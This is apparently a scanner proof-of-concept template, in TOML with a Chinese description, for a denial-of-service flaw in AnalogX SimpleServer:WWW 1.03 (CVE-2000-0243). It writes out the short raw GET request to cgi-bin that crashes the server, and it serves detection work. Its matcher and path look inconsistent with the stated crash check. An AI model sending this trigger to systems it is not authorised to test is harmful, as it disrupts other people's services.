[info]
author = "ave"
description = '此验证旨在检测 AnalogX SimpleServer:WWW 1.03 服务器是否存在拒绝服务漏洞。通过向服务器的 cgi-bin 目录发送异常短的 HTTP GET 请求，验证服务器是否崩溃或变得不可用。只需发送一个极短的原始请求（如"GET /cgi-bin HTTP/1.1\r\n\r\n"），即可触发服务中断。'
id = "POC-AVE-2000-0221"
name = "AnalogX SimpleServer:WWW 1.03 短 GET 到 cgi-bin DoS"
severity = "medium"
tags = ["ave-2000-0221"]
vuln_id = [
    "CVE-2000-0243",
    "AVE-2000-0221",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["short request"]
